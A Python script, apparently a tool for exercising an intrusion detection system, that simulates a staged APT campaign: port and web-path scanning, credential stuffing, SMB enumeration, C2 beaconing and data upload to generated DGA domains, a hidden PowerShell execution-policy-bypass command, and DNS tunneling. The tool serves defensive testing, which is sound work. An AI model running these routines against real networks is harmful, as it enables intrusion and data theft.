#!/usr/bin/env python3
"""
APT Attack Simulator
Generates realistic APT-style network traffic for testing IDS capabilities
Simulates various attack phases: reconnaissance, initial access, persistence, lateral movement, exfiltration
"""

import requests
import time
import random
import subprocess
import threading
import socket
import json
import base64
from datetime import datetime
from urllib.parse import urlencode
import hashlib
import string

class APTSimulator:
    def __init__(self):
        self.target_hosts = ["127.0.0.1", "10.0.0.1", "192.168.1.1"]
        self.attacker_ip = "127.0.0.1"  # Simulated attacker IP
        self.user_agents = [
            "python-requests/2.28.0",
            "curl/7.68.0",
            "PowerShell/7.0",
            "Mozilla/4.0",
            "X",
            "bot/1.0",
        ]
        self.c2_domains = []
        self.session = requests.Session()
        
        # Generate DGA domains
        self._generate_dga_domains()

    def _generate_dga_domains(self):
        """Generate Domain Generation Algorithm (DGA) style domains"""
        seed = datetime.now().day
        random.seed(seed)
        
        for _ in range(10):
            domain_length = random.randint(8, 16)
            domain = ''.join(random.choices(string.ascii_lowercase, k=domain_length))
            tld = random.choice(['.com', '.net', '.tk', '.ml', '.ga'])
            self.c2_domains.append(domain + tld)

    def simulate_reconnaissance(self):
        """Phase 1: Reconnaissance - Port scanning and service discovery"""
        print("\n🔍 Phase 1: Reconnaissance")
        
        # Simulate port scanning
        target = random.choice(self.target_hosts)
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 993, 995, 3389, 5900]
        
        print(f"Simulating port scan against {target}")
        for port in random.sample(ports, 12):  # Scan 12 random ports
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((target, port))
                sock.close()
                time.sleep(random.uniform(0.1, 0.3))
            except:
                pass
        
        # DNS reconnaissance
        print("Simulating DNS reconnaissance")
        suspicious_queries = [
            "_ldap._tcp.dc._msdcs.example.com",
            "_kerberos._tcp.example.com", 
            "_sip._tcp.example.com",
            "mail.example.com",
            "ftp.example.com"
        ]
        
        for query in suspicious_queries:
            try:
                subprocess.run(['dig', query], capture_output=True, timeout=2)
                time.sleep(random.uniform(0.5, 1.0))
            except:
                pass

    def simulate_initial_access(self):
        """Phase 2: Initial Access - Credential stuffing and exploitation"""
        print("\n🚪 Phase 2: Initial Access")
        
        # Simulate credential stuffing
        target_url = "http://127.0.0.1/login"
        credentials = [
            ("admin", "password"),
            ("admin", "admin"), 
            ("root", "password"),
            ("test", "test"),
            ("admin", "123456")
        ]
        
        print("Simulating credential stuffing attack")
        for username, password in credentials:
            try:
                response = self.session.post(
                    target_url,
                    data={"username": username, "password": password},
                    headers={"User-Agent": random.choice(self.user_agents)},
                    timeout=5,
                    allow_redirects=False
                )
                time.sleep(random.uniform(2, 5))
            except:
                pass
        
        # Simulate web application scanning
        print("Simulating web application scanning")
        scan_paths = [
            "/admin/",
            "/wp-admin/",
            "/config/",
            "/backup/",
            "/phpmyadmin/",
            "/.env",
            "/api/v1/",
            "/swagger/",
            "/debug/"
        ]
        
        for path in scan_paths:
            try:
                response = self.session.get(
                    f"http://127.0.0.1{path}",
                    headers={"User-Agent": random.choice(self.user_agents)},
                    timeout=5
                )
                time.sleep(random.uniform(1, 3))
            except:
                pass

    def simulate_c2_communication(self):
        """Phase 3: Command & Control Communication"""
        print("\n📡 Phase 3: C2 Communication")
        
        # Simulate beaconing to C2 domains
        for domain in self.c2_domains[:3]:  # Use first 3 DGA domains
            print(f"Simulating C2 beacon to {domain}")
            
            # HTTP beacons with encoded data
            beacon_data = {
                "id": hashlib.md5(str(time.time()).encode()).hexdigest(),
                "status": "active",
                "data": base64.b64encode("system_info_here".encode()).decode()
            }
            
            try:
                # POST beacon
                response = self.session.post(
                    f"http://{domain}/api/v1/beacon",
                    json=beacon_data,
                    headers={
                        "User-Agent": random.choice(self.user_agents),
                        "Content-Type": "application/json"
                    },
                    timeout=5
                )
                
                # GET with encoded parameters
                encoded_params = base64.b64encode(json.dumps(beacon_data).encode()).decode()
                response = self.session.get(
                    f"http://{domain}/config/?data={encoded_params}",
                    headers={"User-Agent": random.choice(self.user_agents)},
                    timeout=5
                )
                
                time.sleep(random.uniform(30, 60))  # Typical beacon interval
                
            except:
                pass  # Expected to fail as domains don't exist

    def simulate_lateral_movement(self):
        """Phase 4: Lateral Movement"""
        print("\n↔️ Phase 4: Lateral Movement")
        
        # Simulate SMB enumeration
        print("Simulating SMB enumeration")
        try:
            for host in self.target_hosts:
                subprocess.run(['smbclient', '-L', host, '-N'], 
                             capture_output=True, timeout=5)
                time.sleep(random.uniform(2, 4))
        except:
            pass
        
        # Simulate WMI/WinRM attempts
        print("Simulating WMI/WinRM lateral movement")
        wmi_ports = [135, 5985, 5986]
        for host in self.target_hosts:
            for port in wmi_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect_ex((host, port))
                    sock.close()
                    time.sleep(random.uniform(1, 2))
                except:
                    pass

    def simulate_persistence(self):
        """Phase 5: Persistence Mechanisms"""
        print("\n🔄 Phase 5: Persistence")
        
        # Simulate scheduled task creation (via HTTP requests to simulate logs)
        print("Simulating persistence mechanism deployment")
        
        persistence_indicators = [
            "/admin/schedule_task",
            "/api/v1/services",
            "/config/autostart",
            "/system/registry"
        ]
        
        for endpoint in persistence_indicators:
            try:
                response = self.session.post(
                    f"http://127.0.0.1{endpoint}",
                    json={
                        "task_name": f"SystemUpdate_{random.randint(1000, 9999)}",
                        "command": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass",
                        "schedule": "daily"
                    },
                    headers={
                        "User-Agent": random.choice(self.user_agents),
                        "Content-Type": "application/json"
                    },
                    timeout=5
                )
                time.sleep(random.uniform(3, 7))
            except:
                pass

    def simulate_data_exfiltration(self):
        """Phase 6: Data Exfiltration"""
        print("\n📤 Phase 6: Data Exfiltration")
        
        # Generate large data payloads to simulate exfiltration
        print("Simulating data exfiltration")
        
        # Create large data chunk
        sensitive_data = "A" * 150000  # 150KB of data
        
        for domain in self.c2_domains[:2]:
            try:
                # Simulate file upload
                response = self.session.post(
                    f"http://{domain}/upload/",
                    files={
                        'file': ('sensitive_data.txt', sensitive_data, 'text/plain')
                    },
                    headers={"User-Agent": random.choice(self.user_agents)},
                    timeout=10
                )
                
                # Simulate database dump exfiltration
                db_data = json.dumps({
                    "table": "users",
                    "data": [{"id": i, "username": f"user{i}", "email": f"user{i}@example.com"} 
                            for i in range(1000)]
                })
                
                response = self.session.post(
                    f"http://{domain}/api/v1/export",
                    data=db_data,
                    headers={
                        "User-Agent": random.choice(self.user_agents),
                        "Content-Type": "application/json"
                    },
                    timeout=10
                )
                
                time.sleep(random.uniform(10, 20))
                
            except:
                pass

    def simulate_dns_tunneling(self):
        """Simulate DNS tunneling for covert communication"""
        print("\n🕳️ DNS Tunneling Simulation")
        
        # Generate suspicious DNS queries with encoded data
        data_to_exfiltrate = "sensitive_information_here"
        encoded_data = base64.b64encode(data_to_exfiltrate.encode()).decode().replace('=', '')
        
        # Split data into DNS-query-sized chunks
        chunk_size = 20
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            dns_query = f"{chunk}.{random.choice(self.c2_domains)}"
            try:
                subprocess.run(['dig', dns_query], capture_output=True, timeout=3)
                time.sleep(random.uniform(5, 10))
            except:
                pass

    def run_apt_campaign(self):
        """Execute a complete APT campaign simulation"""
        print("🎯 Starting APT Campaign Simulation")
        print("=" * 50)
        
        phases = [
            self.simulate_reconnaissance,
            self.simulate_initial_access,
            self.simulate_c2_communication,
            self.simulate_lateral_movement,
            self.simulate_persistence,
            self.simulate_data_exfiltration,
            self.simulate_dns_tunneling
        ]
        
        for i, phase in enumerate(phases, 1):
            try:
                phase()
                # Random delay between phases
                delay = random.uniform(30, 120)  # 30s to 2min between phases
                print(f"\n⏱️  Waiting {delay:.1f}s before next phase...")
                time.sleep(delay)
            except KeyboardInterrupt:
                print("\n⏹️  Simulation interrupted by user")
                break
            except Exception as e:
                print(f"❌ Error in phase {i}: {e}")
        
        print("\n✅ APT Campaign Simulation Complete")
        print("Check your IDS logs for detected activities!")

def main():
    simulator = APTSimulator()
    
    print("APT Attack Simulator")
    print("===================")
    print("This script simulates various APT attack techniques")
    print("for testing your IDS detection capabilities.")
    print("\nGenerated DGA domains for C2:")
    for domain in simulator.c2_domains:
        print(f"  - {domain}")
    
    print("\n⚠️  WARNING: This generates malicious-looking traffic!")
    print("Only run in controlled test environments.")
    
    response = input("\nProceed with simulation? (y/N): ")
    if response.lower() in ['y', 'yes']:
        simulator.run_apt_campaign()
    else:
        print("Simulation cancelled.")

if __name__ == "__main__":
    main()